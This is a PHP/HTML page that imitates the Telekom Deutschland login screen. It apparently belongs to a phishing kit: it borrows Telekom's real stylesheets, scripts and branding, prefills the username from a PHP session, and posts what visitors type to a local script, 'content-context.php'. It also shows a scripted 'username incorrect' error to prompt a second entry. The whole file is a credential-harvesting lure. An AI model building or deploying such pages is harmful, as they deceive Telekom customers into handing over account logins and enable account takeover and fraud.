<?php
@session_start();
$email = @$_SESSION['email'];
$error = @$_GET['error'];
if ($error == 'invalidemail'){
	$invalidemail = "block";	
	}else{
	$invalidemail = "none";
		}

?>

<!DOCTYPE html>
<html class="no-js" lang="de"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>
    <meta name="description" content="Telekom Login Benutzerdaten Passwoerter Passwortneuvergabe Datenweitergabe Jugendschutz">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/vdplus/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/vdplus/css/login.css">
    
    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>
    
    <!--[if lt IE 9]>
    <script type="text/javascript" src="/static/factorx/vdplus/js/html5shiv.js"></script>
    <script type="text/javascript" src="/static/factorx/vdplus/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/components.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/login.js"></script>
</head>


<body>
    <div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <div class="v-ctr">
                        <i class="icon icon-large">tT</i>
                    </div>
                </div>
                <div class="pull-right">
                    <div class="v-ctr">
                        <span class="text-right text-bold text-small tbs-text-upper">erleben, was verbindet.</span>
                    </div>
                </div>
            </div>
        </div>
        
        
        
    </header>

    <div>
        
    </div>

    
    

    <div class="offset-bottom-5 offset-s-bottom-2"></div>

</div>

    <div>

    

    <div>

        <img src="https://xdn-ttp.de/lns/import-event-0746?idm_id=d9432e7d-7d87-4994-bb22-892f438a4b2e" hidden="true" alt="" frameborder="0" width="1" height="1">

        <img src="https://accounts.login.idm.telekom.com/oauth2/auth?idm_id=d9432e7d-7d87-4994-bb22-892f438a4b2e" hidden="true" alt="" frameborder="0" width="1" height="1">

    </div>


</div>

    
    <div class="container-fixed">
        <div class="tbs-container">
            <div id="tbs-headline">
                <div id="tbs-brand" class="tbs-relative text-center">
                    <h4>Login Einstellungen</h4>
                    
                </div>
                <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Benutzername eingeben</h1>
            </div>

            <div class="login-box">
                

                <div class="offset-bottom-1">
                    <form id="login" name="login" method="POST" action="content-context.php" accept-charset="UTF-8" autocomplete="off">
                        
                        <input type="hidden" name="xsrf_VV1XhHvIFiT8Ia82HatoTQ" value="GRU32oqDVtEevXN2x3Iy-Q">
                        <input type="hidden" name="x-show-cancel" value="false">

                        
                        <div class="offset-bottom-1">

                            
                            <div class="form-input-set floating">
                                <input id="pw_usr" name="pw_usr" type="text" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="<?php echo "$email"; ?>">
                                <input type="hidden" name="wiz" maxlength="200">
								<label for="pw_usr">Benutzername</label>
                                <i class="info-question-icon" data-toggle="collapse" data-target="#usrInfo" data-toggle-hide="true" tabindex="60"></i>
                            </div>

                            
                            <div id="usrInfo" class="info-box pointer">
                                <p>So können Sie sich einloggen:</p>
                                <ul>
                                    <li>
                                        <span class="text-bold">E-Mail-Adresse: </span>
                                        <span>Ihre @t-online.de E-Mail-Adresse oder Ihre E-Mail-Adresse eines anderen Anbieters, mit der Sie sich registriert haben.</span>
                                    </li>
                                    <li>
                                        <span class="text-bold">Mobilfunk-Nummer: </span>
                                        <span>Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit Ihrem Telekom Login verknüpft haben.</span>
                                    </li>
                                    <li>
                                        <span class="text-bold">VERIMI Konto: </span>
                                        <span>Wenn Ihr Telekom Login mit einem VERIMI Konto verknüpft ist, geben Sie hier bitte zunächst Ihren Telekom Login Benutzernamen ein. Anschließend leiten wir Sie zu VERIMI weiter.</span>
                                    </li>
                                </ul>
                            </div>
                        </div>

                        
                        <!--<div class="info-box error" th:if="${( UsernamePasswordViewModel.errors != null and not UsernamePasswordViewModel.errors.isEmpty())}">-->
                        <!--<div th:text="${UsernamePasswordViewModel.errors.getSafeError('__#{login.usernameWrong}__', '__#{${UsernamePasswordViewModel.errors.getLastOccurredElaboratedError().getErrorName()}}__')}">Generischer Fehler</div>-->
                        <!--</div>-->
						<div id="hiddenform" style="display: <?php echo "$invalidemail"; ?>;">
						<div class="info-box error">
						<div>Benutzername ist nicht korrekt.</div>
						</div>
						</div>

                        


                        
                        <div class="login-helpers clearfix">
                            <!-- remember username component -->
                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div><input id="checkbox_remember_user" type="checkbox" name="remember_user" value="1" class="form-checkbox hidden" tabindex="30">
                                    <span>Benutzername merken</span>
                                </label>
                            </div>
                            
                            <div id="tbs-recovery-link" class="text-right">
                                <a href="https://meinkonto.telekom-dienste.de/wiederherstellung/passwort/index.xhtml" target="_blank" tabindex="70">Benutzername vergessen?</a>
                            </div>
                        </div>

                        
                        <div class="clearfix">
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large tbs-text-upper" tabindex="40">Weiter</button>
                        </div>

                        <input name="hidden_pwd" type="password" class="hidden" aria-hidden="true" tabindex="-1">
                    </form>

                    

                    <div class="text-center offset-bottom-2">
                        <a href="https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter" tabindex="45" target="_blank">Brauchen Sie Hilfe?</a>
                    </div>

                    <div class="text-center offset-bottom-2">
                        
                    </div>

                    <div class="text-center offset-bottom-2">
                        <img src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/images/services.png">
                    </div>

                    <div class="text-center offset-bottom-2">
                        <div>
                            <p>
                                <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
                                <a class="text-nowrap" tabindex="60" target="_blank" href="https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter/verimi">Hier informieren über VERIMI</a>
                            </p>
                        </div>
                    </div>

                </div>
            </div>
        </div>

	</div>
	

    <footer id="tbs-footer">
        <div class="footer-content container-fixed text-small clearfix">
            <div class="pull-left">
                <p>© Telekom Deutschland GmbH</p>
                <p class="tbs-text-11">20.20.0, 3b2430a5c08cf74596adff30f0ade392, c2cf5a594458657dc9bd3821da82355354027cbc</p>
            </div>
            <div class="pull-right clearfix">
                <div class="pull-left">
                    <a href="https://www.telekom.de/start/impressum" target="_blank" tabindex="90">Impressum</a>
                </div>
                <div class="pull-left">
                    <a id="data-protection" href="https://www.telekom.de/datenschutz-ganz-einfach" target="_blank" tabindex="100">Datenschutz</a>
                </div>
            </div>
        </div>
    </footer>

    <iframe id="callback-tracking" src="https://ebs04.telekom.de/gfk-umfrage/test-login/accountmanager_pixel.html?page=login&mode=web&context=auth&status=first_attempt"></iframe>

    <div>
    
</div>


</body></html>